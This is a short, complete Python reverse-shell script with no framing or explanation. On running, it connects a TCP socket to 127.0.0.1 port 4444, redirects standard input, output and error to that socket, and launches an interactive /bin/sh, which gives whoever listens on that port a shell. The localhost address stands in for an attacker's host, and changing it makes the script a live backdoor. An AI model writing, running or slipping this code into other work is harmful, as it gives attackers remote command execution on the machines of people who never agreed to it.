import socket
import subprocess
import os

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 4444))
        os.dup2(s.fileno(), 0)  
        os.dup2(s.fileno(), 1)  
        os.dup2(s.fileno(), 2)  
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"Error: {e}")

reverse_shell()
